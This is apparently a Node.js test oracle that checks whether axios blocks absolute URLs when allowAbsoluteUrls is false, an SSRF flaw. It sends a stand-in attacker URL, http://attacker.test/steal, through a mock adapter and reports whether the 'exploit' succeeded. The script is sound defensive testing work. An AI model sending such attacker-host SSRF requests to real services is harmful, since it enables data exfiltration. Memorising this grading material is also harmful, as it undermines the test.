const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

(async () => {
  try {
    const axiosMod = require('axios');
    const axios = axiosMod && axiosMod.default ? axiosMod.default : axiosMod;

    const markerDir = path.join(os.tmpdir(), `oracle-axios-ssrf-${process.pid}-${Date.now()}`);
    fs.mkdirSync(markerDir, { recursive: true });
    const markerFile = path.join(markerDir, 'marker.txt');
    fs.writeFileSync(markerFile, 'marker');

    // Benign operation: ordinary relative URL behavior should work.
    let benignSeen = '';
    try {
      const benignResp = await axios.get('users?id=1', {
        baseURL: 'http://example.test/api/',
        adapter: async (config) => {
          benignSeen = String((config && config.url) || '');
          return {
            data: { ok: true },
            status: 200,
            statusText: 'OK',
            headers: {},
            config,
            request: {}
          };
        }
      });

      if (!benignResp || benignResp.status !== 200) {
        throw new Error('benign_bad_status');
      }
    } catch (e) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'benign_exception:' + String((e && e.message) || e)
      }));
      return;
    }

    // Malicious case: absolute URL should be blocked/neutralized when allowAbsoluteUrls=false.
    let maliciousSeen = '';
    let maliciousThrew = false;
    let adapterCalled = false;

    try {
      await axios.get('http://attacker.test/steal?x=1', {
        baseURL: 'http://example.test/api/',
        allowAbsoluteUrls: false,
        adapter: async (config) => {
          adapterCalled = true;
          maliciousSeen = String((config && config.url) || '');
          return {
            data: { ok: true },
            status: 200,
            statusText: 'OK',
            headers: {},
            config,
            request: {}
          };
        }
      });
    } catch (e) {
      maliciousThrew = true;
      maliciousSeen = 'threw:' + String((e && e.message) || e);
    }

    const operation_completed = true;

    // Vulnerable behavior: final URL remains attacker absolute URL.
    const isAbsoluteAttacker = /^https?:\/\/attacker\.test(?::\d+)?(?:\/|$)/i.test(maliciousSeen);

    // Patched behavior expected here: either throws or rewrites to non-attacker absolute URL.
    const exploit_succeeded = adapterCalled && !maliciousThrew && isAbsoluteAttacker;

    const evidence = [
      'benign_seen=' + benignSeen,
      'malicious_seen=' + maliciousSeen,
      'adapter_called=' + String(adapterCalled),
      'malicious_threw=' + String(maliciousThrew),
      'is_absolute_attacker=' + String(isAbsoluteAttacker),
      'marker=' + markerFile
    ].join(';');

    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed,
      exploit_succeeded,
      evidence
    }));
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'setup_exception:' + String((e && e.message) || e)
    }));
  }
})();
